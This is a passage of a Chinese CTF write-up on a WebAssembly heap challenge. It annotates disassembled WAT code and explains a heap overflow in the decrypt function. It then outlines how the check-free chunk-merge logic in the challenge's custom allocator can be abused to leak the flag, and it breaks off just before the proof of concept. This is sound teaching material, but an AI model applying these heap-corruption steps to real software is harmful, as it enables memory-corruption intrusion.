        <span class="token punctuation">(</span>func <span class="token punctuation">(</span><span class="token punctuation">;</span>decrypt<span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>type <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>result i32<span class="token punctuation">)</span>
        <span class="token punctuation">(</span>local i32 i32 i32 i32 i32 i32 i32<span class="token punctuation">)</span>
        i32<span class="token punctuation">.</span>const <span class="token number">32</span>
        call malloc 
        set_local <span class="token number">5</span>             <span class="token operator">/</span><span class="token operator">/</span> var_5 <span class="token operator">=</span> malloc<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        i32<span class="token punctuation">.</span>const <span class="token number">1024</span>
        call malloc
        set_local <span class="token number">0</span>             <span class="token operator">/</span><span class="token operator">/</span> var_0 <span class="token operator">=</span> malloc<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        i32<span class="token punctuation">.</span>const <span class="token number">8</span>             
        call malloc
        set_local <span class="token number">1</span>             <span class="token operator">/</span><span class="token operator">/</span> var_1 <span class="token operator">=</span> malloc<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        i32<span class="token punctuation">.</span>const <span class="token number">16</span>
        call malloc
        set_local <span class="token number">2</span>             <span class="token operator">/</span><span class="token operator">/</span> var_2 <span class="token operator">=</span> malloc<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        i32<span class="token punctuation">.</span>const <span class="token number">2672</span>
        get_local <span class="token number">5</span>             
        i32<span class="token punctuation">.</span>const <span class="token number">32</span>
        call read_file          <span class="token operator">/</span><span class="token operator">/</span> readfile<span class="token punctuation">(</span><span class="token number">21</span><span class="token punctuation">,</span> var_5<span class="token punctuation">,</span> <span class="token number">2672</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        drop
        get_local <span class="token number">0</span>
        call read_data          
        set_local <span class="token number">3</span>             <span class="token operator">/</span><span class="token operator">/</span> var_3 <span class="token operator">=</span> read_data<span class="token punctuation">(</span>var_0<span class="token punctuation">)</span><span class="token punctuation">;</span>
        get_local <span class="token number">1</span>
        call read_pass          <span class="token operator">/</span><span class="token operator">/</span> read_pass<span class="token punctuation">(</span>var_1<span class="token punctuation">)</span><span class="token punctuation">;</span>
        drop
        i32<span class="token punctuation">.</span>const <span class="token number">0</span>
        set_local <span class="token number">6</span>             <span class="token operator">/</span><span class="token operator">/</span> var_6 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        block  <span class="token punctuation">;</span><span class="token punctuation">;</span> label <span class="token operator">=</span> @<span class="token number">1</span>
          loop  <span class="token punctuation">;</span><span class="token punctuation">;</span> label <span class="token operator">=</span> @<span class="token number">2</span>       <span class="token operator">/</span><span class="token operator">/</span> <span class="token keyword">while</span><span class="token punctuation">;</span>
            get_local <span class="token number">6</span>
            i32<span class="token punctuation">.</span>const <span class="token number">16</span>
            i32<span class="token punctuation">.</span>eq
            br_if <span class="token number">1</span> <span class="token punctuation">(</span><span class="token punctuation">;</span>@<span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">)</span>          <span class="token operator">/</span><span class="token operator">/</span> <span class="token keyword">if</span><span class="token punctuation">(</span>var_6 <span class="token operator">==</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>
            get_local <span class="token number">2</span>
            get_local <span class="token number">6</span>
            i32<span class="token punctuation">.</span>add             <span class="token operator">/</span><span class="token operator">/</span>  var_2 <span class="token operator">+</span> var_6<span class="token punctuation">;</span>
            get_local <span class="token number">0</span>
            get_local <span class="token number">6</span>
            i32<span class="token punctuation">.</span>add             <span class="token operator">/</span><span class="token operator">/</span>  var_0 <span class="token operator">+</span> var_6<span class="token punctuation">;</span>
            i32<span class="token punctuation">.</span>load8_u         
            i32<span class="token punctuation">.</span>store8          <span class="token operator">/</span><span class="token operator">/</span> <span class="token operator">*</span><span class="token punctuation">(</span>var_2 <span class="token operator">+</span> var_6<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>var_0<span class="token operator">+</span>var_6<span class="token punctuation">)</span><span class="token punctuation">;</span>
            get_local <span class="token number">6</span>
            i32<span class="token punctuation">.</span>const <span class="token number">1</span>
            i32<span class="token punctuation">.</span>add             
            set_local <span class="token number">6</span>
            br <span class="token number">0</span> <span class="token punctuation">(</span><span class="token punctuation">;</span>@<span class="token number">2</span><span class="token punctuation">;</span><span class="token punctuation">)</span>         <span class="token operator">/</span><span class="token operator">/</span> var_6 <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
          <span class="token keyword">end</span>
        <span class="token keyword">end</span>
        get_local <span class="token number">5</span>
        i32<span class="token punctuation">.</span>const <span class="token number">32</span>
        call hash               
        set_local <span class="token number">4</span>             <span class="token operator">/</span><span class="token operator">/</span> var_4 <span class="token operator">=</span> hash<span class="token punctuation">(</span>var_5<span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        i32<span class="token punctuation">.</span>const <span class="token number">0</span>
        set_local <span class="token number">6</span>             <span class="token operator">/</span><span class="token operator">/</span> var_6 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        block  <span class="token punctuation">;</span><span class="token punctuation">;</span> label <span class="token operator">=</span> @<span class="token number">1</span>
          loop  <span class="token punctuation">;</span><span class="token punctuation">;</span> label <span class="token operator">=</span> @<span class="token number">2</span>
            get_local <span class="token number">6</span>
            i32<span class="token punctuation">.</span>const <span class="token number">8</span>
            i32<span class="token punctuation">.</span>eq
            br_if <span class="token number">1</span> <span class="token punctuation">(</span><span class="token punctuation">;</span>@<span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">)</span>          <span class="token operator">/</span><span class="token operator">/</span> <span class="token keyword">if</span><span class="token punctuation">(</span>var_6 <span class="token operator">==</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>
            get_local <span class="token number">4</span>
            get_local <span class="token number">6</span>
            i32<span class="token punctuation">.</span>add             <span class="token operator">/</span><span class="token operator">/</span> var_4 <span class="token operator">+</span> var_6<span class="token punctuation">;</span>
            tee_local <span class="token number">5</span>         <span class="token operator">/</span><span class="token operator">/</span> var_5 <span class="token operator">=</span> var_4 <span class="token operator">+</span> var_6
            get_local <span class="token number">5</span>
            i32<span class="token punctuation">.</span>load8_u         <span class="token operator">/</span><span class="token operator">/</span> <span class="token operator">*</span>var_5<span class="token punctuation">;</span>
            get_local <span class="token number">1</span>
            get_local <span class="token number">6</span>
            i32<span class="token punctuation">.</span>add             <span class="token operator">/</span><span class="token operator">/</span> var_1 <span class="token operator">+</span> var_6<span class="token punctuation">;</span>
            i32<span class="token punctuation">.</span>load8_u         <span class="token operator">/</span><span class="token operator">/</span> <span class="token operator">*</span><span class="token punctuation">(</span>var_1 <span class="token operator">+</span> var_6<span class="token punctuation">)</span><span class="token punctuation">;</span>
            i32<span class="token punctuation">.</span>xor
            i32<span class="token punctuation">.</span>store8          <span class="token operator">/</span><span class="token operator">/</span> <span class="token operator">*</span><span class="token punctuation">(</span>var_4 <span class="token operator">+</span> var_6<span class="token punctuation">)</span> <span class="token operator">^</span><span class="token operator">=</span> <span class="token operator">*</span>var_5<span class="token punctuation">;</span>
            get_local <span class="token number">6</span>
            i32<span class="token punctuation">.</span>const <span class="token number">1</span>
            i32<span class="token punctuation">.</span>add
            set_local <span class="token number">6</span>         <span class="token operator">/</span><span class="token operator">/</span> var_6 <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
            br <span class="token number">0</span> <span class="token punctuation">(</span><span class="token punctuation">;</span>@<span class="token number">2</span><span class="token punctuation">;</span><span class="token punctuation">)</span>
          <span class="token keyword">end</span>
        <span class="token keyword">end</span>
        get_local <span class="token number">1</span>
        call free               <span class="token operator">/</span><span class="token operator">/</span> free<span class="token punctuation">(</span>var_<span class="token operator">!</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        get_local <span class="token number">4</span>
        i32<span class="token punctuation">.</span>const <span class="token number">16</span>
        call hash               
        set_local <span class="token number">1</span>             <span class="token operator">/</span><span class="token operator">/</span> var_1 <span class="token operator">=</span> hash<span class="token punctuation">(</span>var_4<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
        get_local <span class="token number">4</span>
        call free               <span class="token operator">/</span><span class="token operator">/</span> free<span class="token punctuation">(</span>var_4<span class="token punctuation">)</span><span class="token punctuation">;</span>
        i32<span class="token punctuation">.</span>const <span class="token number">0</span>
        set_local <span class="token number">6</span>             <span class="token operator">/</span><span class="token operator">/</span> var_6 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        block  <span class="token punctuation">;</span><span class="token punctuation">;</span> label <span class="token operator">=</span> @<span class="token number">1</span>
          loop  <span class="token punctuation">;</span><span class="token punctuation">;</span> label <span class="token operator">=</span> @<span class="token number">2</span>
            get_local <span class="token number">6</span>
            i32<span class="token punctuation">.</span>const <span class="token number">16</span>
            i32<span class="token punctuation">.</span>eq
            br_if <span class="token number">1</span> <span class="token punctuation">(</span><span class="token punctuation">;</span>@<span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">)</span>          <span class="token operator">/</span><span class="token operator">/</span> <span class="token keyword">if</span><span class="token punctuation">(</span>var_6 <span class="token operator">==</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>
            get_local <span class="token number">1</span>
            get_local <span class="token number">6</span>
            i32<span class="token punctuation">.</span>add
            tee_local <span class="token number">5</span>
            get_local <span class="token number">5</span>
            i32<span class="token punctuation">.</span>load8_u
            get_local <span class="token number">2</span>
            get_local <span class="token number">6</span>
            i32<span class="token punctuation">.</span>add
            i32<span class="token punctuation">.</span>load8_u
            i32<span class="token punctuation">.</span>xor
            i32<span class="token punctuation">.</span>store8          <span class="token operator">/</span><span class="token operator">/</span> &#x548C;&#x4E4B;&#x524D;&#x4E00;&#x6837;<span class="token punctuation">(</span>var_1 <span class="token operator">+</span> var_6<span class="token punctuation">)</span> <span class="token operator">^</span><span class="token operator">=</span> <span class="token punctuation">(</span>var_2 <span class="token operator">+</span> var_6<span class="token punctuation">)</span><span class="token punctuation">;</span>
            get_local <span class="token number">6</span>
            i32<span class="token punctuation">.</span>const <span class="token number">1</span>
            i32<span class="token punctuation">.</span>add
            set_local <span class="token number">6</span>         <span class="token operator">/</span><span class="token operator">/</span> var_6 <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
            br <span class="token number">0</span> <span class="token punctuation">(</span><span class="token punctuation">;</span>@<span class="token number">2</span><span class="token punctuation">;</span><span class="token punctuation">)</span>
          <span class="token keyword">end</span>
        <span class="token keyword">end</span>
        get_local <span class="token number">2</span>
        call free               <span class="token operator">/</span><span class="token operator">/</span> free<span class="token punctuation">(</span>var_2<span class="token punctuation">)</span><span class="token punctuation">;</span>
        get_local <span class="token number">1</span>             <span class="token operator">/</span><span class="token operator">/</span> var_1
        get_local <span class="token number">0</span>
        i32<span class="token punctuation">.</span>const <span class="token number">16</span>
        i32<span class="token punctuation">.</span>add             <span class="token operator">/</span><span class="token operator">/</span> var_0 <span class="token operator">+</span> <span class="token number">16</span>
        get_local <span class="token number">3</span>
        call malloc             <span class="token operator">/</span><span class="token operator">/</span> out <span class="token operator">=</span> malloc<span class="token punctuation">(</span>var_3<span class="token punctuation">)</span><span class="token punctuation">;</span>
        tee_local <span class="token number">6</span>
        get_local <span class="token number">3</span>             
        i32<span class="token punctuation">.</span>const <span class="token operator">-</span><span class="token number">16</span>
        i32<span class="token punctuation">.</span>add             <span class="token operator">/</span><span class="token operator">/</span> var_3 <span class="token operator">-</span> <span class="token number">16</span>
        tee_local <span class="token number">2</span>             <span class="token operator">/</span><span class="token operator">/</span> var2 <span class="token operator">=</span> var_3 <span class="token operator">-</span> <span class="token number">16</span>
        call mycrypt            <span class="token operator">/</span><span class="token operator">/</span> mycrypt<span class="token punctuation">(</span>var_1 <span class="token punctuation">,</span>var_0 <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">,</span> out<span class="token punctuation">,</span> var_3 <span class="token operator">-</span> <span class="token number">16</span><span class="token punctuation">)</span>
        i32<span class="token punctuation">.</span>const <span class="token number">0</span>
        get_local <span class="token number">2</span>
        i32<span class="token punctuation">.</span>store offset<span class="token operator">=</span><span class="token number">2680</span>       <span class="token operator">/</span><span class="token operator">/</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">2680</span><span class="token punctuation">)</span> <span class="token operator">=</span> var_2<span class="token punctuation">;</span>
        get_local <span class="token number">0</span>
        call free               <span class="token operator">/</span><span class="token operator">/</span> free<span class="token punctuation">(</span>var_0<span class="token punctuation">)</span><span class="token punctuation">;</span>
        get_local <span class="token number">6</span><span class="token punctuation">)</span></code></pre><p>&#x8FD9;&#x6837;&#x5C31;&#x7FFB;&#x8BD1;&#x7684;&#x5DEE;&#x4E0D;&#x591A;&#x4E86;&#xFF0C;&#x5E94;&#x8BE5;&#x548C;&#x6211;&#x5F00;&#x59CB;&#x5BF9;&#x52A0;&#x89E3;&#x5BC6;&#x7684;&#x63CF;&#x8FF0;&#x5DEE;&#x4E0D;&#x591A;&#xFF0C;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#xFF0C;js&#x5C42;&#x4F20;&#x5165;&#x7684;data&#x957F;&#x5EA6;&#x6700;&#x957F;&#x53EF;&#x4EE5;&#x6709;0x1000&#x4E2A;&#x5B57;&#x8282;&#xFF0C;&#x4F46;&#x4ECE;decrypt&#x51FD;&#x6570;&#x53EF;&#x4EE5;&#x770B;&#x51FA;data&#x8FD9;&#x53EA;malloc&#x4E86;1024&#x4E2A;&#x5B57;&#x8282;&#xFF0C;&#x4E8E;&#x662F;&#x591A;&#x51FA;&#x6765;&#x7684;&#x5C31;&#x9020;&#x6210;&#x4E86;&#x4E00;&#x4E2A;&#x5806;&#x6EA2;&#x51FA;&#xFF0C;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x7C7B;&#x4F3C;&#x65B9;&#x5F0F;&#xFF08;&#x624B;&#x5DE5;&#xFF09;&#x5BF9;&#x5176;&#x4ED6;&#x51FD;&#x6570;&#x5305;&#x62EC;malloc&#x548C;free&#x51FD;&#x6570;&#x8FDB;&#x884C;&#x9006;&#x5411;&#xFF0C;&#x867D;&#x7136;&#x5DE5;&#x4F5C;&#x4F1A;&#x8270;&#x8F9B;&#x5F88;&#x591A;233&#x3002;</p> <p>&#x63A5;&#x4E0B;&#x6765;&#x6211;&#x4EEC;&#x6765;&#x770B;&#x770B;&#x5982;&#x4F55;&#x5229;&#x7528;&#xFF0C;&#x6765;&#x770B;&#x770B;&#x5F00;&#x59CB;&#x7684;&#x90A3;&#x51E0;&#x4E2A;malloc&#x4E4B;&#x540E;&#x7684;layout</p> <pre><code>    heapbase<span class="token punctuation">:</span>               flag
    key<span class="token operator">+</span><span class="token number">32</span><span class="token operator">+</span><span class="token number">12</span><span class="token punctuation">:</span>              data
    data<span class="token operator">+</span><span class="token number">1024</span><span class="token operator">+</span><span class="token number">12</span><span class="token punctuation">:</span>               pass
    pass<span class="token operator">+</span><span class="token number">8</span><span class="token operator">+</span><span class="token number">12</span><span class="token punctuation">:</span>              random</code></pre><p>&#x53EF;&#x4EE5;&#x770B;&#x5230;data&#x4E0B;&#x9762;&#x5C31;&#x662F;pass&#x548C;random&#xFF0C;&#x9664;&#x4E86;flag&#x6CA1;&#x6709;&#x88AB;free&#xFF08;&#x8FD9;&#x662F;&#x6211;&#x89C9;&#x5F97;&#x5F3A;&#x884C;&#x51FA;&#x9898;&#x7684;&#x4E00;&#x70B9;&#x3002;&#x3002;&#x3002;&#xFF09;&#xFF0C;&#x4E0B;&#x9762;&#x7684;pass&#x548C;random&#x90FD;&#x4F1A;&#x5728;&#x7528;&#x5B8C;&#x4E4B;&#x540E;&#x88AB;free&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x60F3;&#x60F3;&#x600E;&#x4E48;&#x628A;flag leak&#x51FA;&#x6765;&#x5427;&#xFF01;</p> <hr> <p>&#x63A5;&#x4E0B;&#x6765;&#x7684;&#x90E8;&#x5206;&#x53EF;&#x80FD;&#x5BF9;&#x4E0D;&#x4E86;&#x89E3;&#x5806;&#x5185;&#x90E8;&#x7684;&#x4EBA;&#x5F88;&#x6A21;&#x7CCA;&#xFF0C;&#x5982;&#x679C;&#x6CA1;&#x770B;&#x8FC7;&#x6E90;&#x7801;&#x6216;&#x8005;&#x81EA;&#x5DF1;&#x9006;&#x8FC7;&#x5C31;&#x522B;&#x770B;&#x4E86;====</p> <p>&#x9ED8;&#x8BA4;&#x4F60;&#x5DF2;&#x7ECF;&#x77E5;&#x9053;&#x8FD9;&#x4E2A;&#x5806;&#x548C;&#x52A0;&#x89E3;&#x5BC6;&#x90E8;&#x5206;&#x7684;&#x5B9E;&#x73B0;&#x4E86;&#x3002;</p> <p>&#x53EF;&#x4EE5;&#x60F3;&#x5230;&#x7684;&#x4E00;&#x4E2A;&#x6700;&#x7B80;&#x5355;&#x7684;&#x65B9;&#x5F0F;&#x662F;&#x8BA9;&#x6700;&#x540E;output&#x6307;&#x9488;malloc&#x5230;flag&#x524D;&#x9762;&#xFF0C;&#x7136;&#x540E;&#x4FEE;&#x6539;2680&#x90A3;&#x4E2A;outsize&#x5230;&#x5408;&#x9002;&#x5927;&#x5C0F;&#xFF08;&#x5982;&#x679C;&#x5927;&#x5C0F;&#x8D85;&#x8FC7;&#x4E86;memory&#x957F;&#x5EA6;&#xFF0C;&#x4E0D;&#x4F1A;&#x53CD;&#x56DE;&#x7ED3;&#x679C;&#xFF09;&#x3002;&#x95EE;&#x9898;&#x662F;&#x5728;&#x4E8E;&#x600E;&#x4E48;&#x5B9E;&#x73B0;&#xFF0C;&#x6211;&#x4EEC;&#x80FD;&#x505A;&#x7684;&#xFF1A;</p> <ul> <li><ol> <li>&#x5728;&#x7A0B;&#x5E8F;&#x5F00;&#x59CB;&#x7684;&#x65F6;&#x5019;&#x6EA2;&#x51FA;data&#x5757;&#xFF0C;&#x80FD;&#x62FF;&#x5230;&#x4E24;&#x4E2A;&#x53EF;&#x63A7;&#x7684;&#x5373;&#x5C06;&#x88AB;free&#x7684;&#x5806;&#x5757;</li> </ol> </li> <li><ol> <li>&#x6700;&#x540E;&#x4FEE;&#x6539;outsize&#x7684;&#x65F6;&#x5019;&#x53EA;&#x6709;&#x4E00;&#x4E2A;&#x64CD;&#x4F5C;&#x5C31;&#x662F;free(data); &#x4E5F;&#x5C31;&#x662F;&#x5F97;&#x5728;free&#x4E4B;&#x540E;&#x6539;&#x6389;2680&#x90A3;&#x4E2A;size</li> </ol> </li> </ul> <p>&#x505A;&#x5230;&#x8FD9;&#x4E24;&#x70B9;&#x5728;glibc&#x91CC;&#x5E94;&#x8BE5;&#x662F;&#x4E0D;&#x53EF;&#x80FD;&#x7684;&#xFF0C;&#x4F46;&#x8FD9;&#x4E2A;&#x5806;&#x6CA1;&#x6709;&#x4EFB;&#x4F55;check&#x3002;</p> <p>&#x505A;&#x5230;&#x8FD9;&#x4E2A;&#x7684;&#x6700;&#x5173;&#x952E;&#x7684;&#x4E00;&#x70B9;&#x5728;merge&#x7684;&#x65F6;&#x5019;</p> <pre><code>    void free<span class="token punctuation">(</span>unsigned char<span class="token operator">*</span> ptr<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        struct chunk<span class="token operator">*</span> current <span class="token operator">=</span> to_chunk<span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
        struct chunk<span class="token operator">*</span> <span class="token keyword">next</span> <span class="token operator">=</span> next_chunk<span class="token punctuation">(</span>current<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>current<span class="token operator">-</span><span class="token operator">&gt;</span>size <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            struct chunk<span class="token operator">*</span> pre <span class="token operator">=</span> to_mem<span class="token punctuation">(</span>current<span class="token punctuation">)</span> <span class="token operator">-</span> current<span class="token operator">-</span><span class="token operator">&gt;</span>pre_size <span class="token operator">-</span> <span class="token number">12</span><span class="token punctuation">;</span>
            pre<span class="token operator">-</span><span class="token operator">&gt;</span>size <span class="token operator">+</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>current<span class="token operator">-</span><span class="token operator">&gt;</span>size<span class="token operator">&amp;</span><span class="token number">0xfffffffe</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token operator">/</span><span class="token operator">/</span> unlink pre
            unlink<span class="token punctuation">(</span>pre<span class="token punctuation">)</span><span class="token punctuation">;</span>
            current <span class="token operator">=</span> pre<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
    <span class="token punctuation">}</span></code></pre><p>&#x4E0D;&#x4F1A;&#x6709;&#x4EFB;&#x4F55;&#x7684;check&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x6211;&#x4EEC;&#x80FD;&#x628A;&#x5F53;&#x524D;&#x7684;size&#x52A0;&#x5230;prev&#x5757;&#x7684;size&#x4F4D;&#x4E0A;&#xFF0C;&#x4F46;prev&#x5757;&#x7684;size&#x4F4D;&#x7684;&#x4F4D;&#x7F6E;&#x662F;&#x7531;&#x5F53;&#x524D;&#x5806;&#x5757;&#x7684;pre_size&#x4F4D;&#x51B3;&#x5B9A;&#x7684;&#xFF0C;&#x4E8E;&#x662F;&#x5C31;&#x80FD;&#x5728;&#x524D;&#x9762;&#x4EFB;&#x610F;&#x4F4D;&#x7F6E;&#x52A0;&#x4E0A;&#x5F53;&#x524D;size&#xFF0C;&#x53EA;&#x662F;&#x8FD9;&#x4E2A;size&#x4E0D;&#x80FD;&#x592A;&#x5927;&#xFF0C;&#x4E0D;&#x7136;&#x5728;&#x627E;&#x5F53;&#x524D;&#x5757;&#x7684;&#x4E0B;&#x4E00;&#x5757;&#x7684;&#x65F6;&#x5019;&#x4F1A;&#x8D85;&#x51FA;memory&#x957F;&#x5EA6;&#x3002;</p> <p>&#x73B0;&#x5728;&#x6709;&#x4EFB;&#x610F;&#x5199;&#x4E86;&#xFF0C;&#x4F46;&#x6709;&#x4E00;&#x4E2A;&#x95EE;&#x9898;&#xFF0C;&#x8981;&#x505A;&#x5230;&#x8FD9;&#x70B9;&#x5F97;&#x628A;&#x5F53;&#x524D;&#x5757;&#x7684;inuse&#x4F4D;&#x6E05;0&#xFF0C;&#x800C;data&#x5757;&#x8981;&#x6539;inuse&#x4F4D;&#x4E0D;&#x5BB9;&#x6613;&#x3002;&#x56E0;&#x4E3A;&#x4E0A;&#x9762;&#x6CA1;&#x6709;&#x4EFB;&#x4F55;&#x5806;&#x5757;&#xFF0C;&#x800C;&#x4E14;&#x4E5F;&#x4E0D;&#x80FD;&#x62FF;&#x4E24;&#x4E2A;&#x80FD;&#x6EA2;&#x51FA;&#x7684;&#x5806;&#x5757;&#x4E2D;&#x4E00;&#x4E2A;&#x5806;&#x5757;&#x6539;size&#xFF0C;&#x56E0;&#x4E3A;&#x53EA;&#x80FD;&#x52A0;&#x4E0A;&#x5076;&#x6570;&#x7684;size&#xFF0C;&#x5E76;&#x4E0D;&#x80FD;&#x6539;&#x53D8;size&#x7684;inuse&#x4F4D;&#x3002;</p> <p>&#x6CA1;&#x6709;&#x5806;&#x5757;&#x5C31;&#x81EA;&#x5DF1;&#x521B;&#x5EFA;&#x5806;&#x5757;&#xFF01;free&#x7684;&#x65F6;&#x5019;&#x4F1A;merge&#x4E0A;&#x9762;&#x7684;&#x5806;&#x5757;&#xFF0C;&#x7136;&#x540E;merge&#x4E4B;&#x540E;&#x7684;&#x90A3;&#x4E2A;size&#x6211;&#x4EEC;&#x662F;&#x53EF;&#x63A7;&#x7684;&#xFF0C;&#x5728;free&#x7684;&#x6700;&#x540E;&#xFF0C;&#x4F1A;&#x6E05;&#x7A7A;&#x4E0B;&#x4E00;&#x5757;&#x7684;inuse&#x4F4D;&#x7136;&#x540E;&#x8BBE;&#x7F6E;pre_size</p> <pre><code>    <span class="token operator">/</span><span class="token operator">/</span> link current to bins
        int index <span class="token operator">=</span> find_index<span class="token punctuation">(</span>current<span class="token operator">-</span><span class="token operator">&gt;</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>
        current<span class="token operator">-</span><span class="token operator">&gt;</span>fd <span class="token operator">=</span> bins<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">;</span>
        bins<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">=</span> current<span class="token punctuation">;</span>
        <span class="token operator">/</span><span class="token operator">/</span> clear <span class="token keyword">next</span> chunk&apos;s inuse bit <span class="token keyword">and</span> set the pre_size
        <span class="token keyword">next</span> <span class="token operator">=</span> next_chunk<span class="token punctuation">(</span>current<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">next</span><span class="token operator">-</span><span class="token operator">&gt;</span>size <span class="token operator">&amp;</span><span class="token operator">=</span> <span class="token number">0xfffffffe</span><span class="token punctuation">;</span>
        <span class="token keyword">next</span><span class="token operator">-</span><span class="token operator">&gt;</span>pre_size <span class="token operator">=</span> current<span class="token operator">-</span><span class="token operator">&gt;</span>size<span class="token operator">&amp;</span><span class="token number">0xfffffffe</span><span class="token punctuation">;</span></code></pre><p>&#x90A3;&#x4E48;&#x601D;&#x8DEF;&#x5C31;&#x51FA;&#x6765;&#x4E86;&#xFF1A;</p> <ul> <li><ol> <li>&#x8986;&#x76D6;pass&#x5806;&#x5757;&#xFF0C;&#x4F7F;&#x5176;merge&#x5B8C;&#x7684;&#x7ED3;&#x679C;&#x5728;data&#x4E0A;&#x9762;&#xFF0C;&#x540C;&#x65F6;&#x8BBE;&#x7F6E;data&#x5757;&#x7684;size&#x5B57;&#x6BB5;</li> </ol> </li> <li><ol> <li>&#x8986;&#x76D6;random&#x5806;&#x5757;&#xFF0C;&#x8BBE;&#x7F6E;data&#x5757;&#x7684;pre_size</li> </ol> </li> <li><ol> <li>malloc output&#x7684;&#x7ED3;&#x679C;&#x4F1A;&#x5230;key&#x4E0A;&#x9762;&#x90A3;&#x6BB5;</li> </ol> </li> <li><ol> <li>free data&#x5757;&#x7684;&#x65F6;&#x5019;&#x5C31;&#x80FD;&#x628A;size&#x52A0;&#x5230;outsize&#xFF0C;&#x8FBE;&#x5230;leak</li> </ol> </li> </ul> <p>&#x7136;&#x800C;&#x5B9E;&#x9645;&#x64CD;&#x4F5C;&#x4E2D;&#x4E24;&#x4E2A;free&#x7684;&#x5806;&#x5757;&#x5728;bins&#x4E2D;&#x7684;&#x957F;&#x5EA6;&#x90FD;&#x4F1A;&#x8D85;&#x8FC7;0x200&#x7136;&#x540E;&#x5206;&#x5230;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#x94FE;&#x8868;&#xFF0C;output&#x4F1A;&#x4F18;&#x5148;&#x53D6;random&#x5806;&#x5757;free&#x7684;&#x90A3;&#x5757;&#x3002;&#x6240;&#x4EE5;&#x5F97;&#x628A;1&#xFF0C;2&#x7684;&#x64CD;&#x4F5C;&#x53CD;&#x4E00;&#x4E0B;&#x3002;&#x7136;&#x540E;&#x8FD9;&#x9898;&#x5C31;&#x89E3;&#x51B3;&#x4E86;&#xFF0C;&#x53EF;&#x559C;&#x53EF;&#x8D3A;&#xFF08;</p> <p>ps&#xFF1A;&#x51FA;&#x9898;&#x4EBA;&#x6CA1;&#x6709;&#x6E90;&#x7801;&#x5927;&#x6982;&#x4E5F;&#x6CA1;&#x6CD5;&#x505A;&#x51FA;&#x6765;</p> <p>pps&#xFF1A;&#x5199;&#x5806;&#x7BA1;&#x7406;&#x5F88;&#x6709;&#x610F;&#x601D;&#xFF0C;&#x51FA;&#x5B8C;&#x9898;&#x770B;&#x7740;&#x6E90;&#x7801;&#x81EA;&#x5DF1;&#x65E5;&#x81EA;&#x5DF1;&#x5199;&#x7684;&#x9898;&#x8FD8;&#x65E5;&#x4E86;&#x4E00;&#x6574;&#x5929;&#x4E5F;&#x5F88;&#x6709;&#x610F;&#x601D;</p> <p>ppps&#xFF1A;&#x6BD4;&#x8D5B;&#x5B8C;&#x518D;&#x9006;&#x4E00;&#x904D;&#x81EA;&#x5DF1;&#x7684;&#x9898;&#x4E0D;&#x5BB9;&#x6613;&#xFF0C;&#x5404;&#x4F4D;&#x8981;&#x6253;&#x51FA;&#x9898;&#x4EBA;&#x7684;&#x8BF7;&#x624B;&#x4E0B;&#x7559;&#x60C5;orz</p> <p>poc&#xFF1A;</p> <pre><code 